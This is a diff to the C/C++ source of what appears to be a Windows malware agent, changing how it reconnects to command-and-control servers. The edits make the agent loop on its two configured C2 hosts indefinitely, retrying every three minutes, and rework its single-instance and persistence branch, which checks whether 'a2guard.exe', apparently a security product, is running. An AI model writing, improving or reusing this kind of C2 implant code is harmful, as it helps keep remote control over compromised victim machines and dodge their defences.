@@ -1478,6 +1478,7 @@ int agent_main_loop(char *addr, uint16_t port)
 	size_t pos{};
 	SOCKET sockets[200]{};
 	HANDLE threads[200]{};
+	int result = -1;
 
 	event = CreateEventA(nullptr, false, true, nullptr);
 	buffer = (uint8_t *)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -1514,6 +1515,7 @@ int agent_main_loop(char *addr, uint16_t port)
 
 	nonblocking = 0;
 	ioctlsocket(main_socket, FIONBIO, &nonblocking);
+	result = 1;
 
 	tcp_keepalive.onoff = 1;
 	tcp_keepalive.keepalivetime = SECONDS(600);
@@ -1704,7 +1706,7 @@ close_conn:
 	CloseHandle(event);
 	VirtualFree(buffer, 0, MEM_RELEASE);
 
-	return 0;
+	return result;
 }
 
 LRESULT WINAPI agent_window_proc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
@@ -1834,8 +1836,16 @@ void agent_connect_to_c2()
 	char *ip = g_config.Host1 + 6;
 	int port = atoi((char *)g_config.Port1 + 6);
 
-	while (agent_main_loop(ip, port) < 0)
+	for (;;)
 	{
+		int result = agent_main_loop(ip, port);
+		
+		if (result > 0)
+		{
+			Sleep(MINUTES(3));
+			continue;
+		}
+
 		if (ip == g_config.Host1 + 6)
 		{
 			ip = g_config.Host2 + 6;
@@ -1845,8 +1855,6 @@ void agent_connect_to_c2()
 		{
 			ip = g_config.Host1 + 6;
 		}
-
-		Sleep(MINUTES(3));
 	}
 }
 
@@ -1915,13 +1923,9 @@ int main()
 
 	if (start2_arg_exists)
 	{
-		if (GetLastError() == ERROR_ALREADY_EXISTS)
+		if (GetLastError() != ERROR_ALREADY_EXISTS)
 		{
-			goto exit;
-		}
-		else
-		{
-			goto persist;
+			agent_connect_to_c2();
 		}
 	}
 
@@ -1938,7 +1942,6 @@ int main()
 			agent_connect_to_c2();
 		}
 
-	persist:
 		if (windows_is_process_running("a2guard.exe"))
 		{
 			char binary_path[0x100] = {0};
@@ -1950,7 +1953,6 @@ int main()
 		}
 	}
 
-exit:
 	Sleep(SECONDS(60));
 	ExitProcess(0);
 }
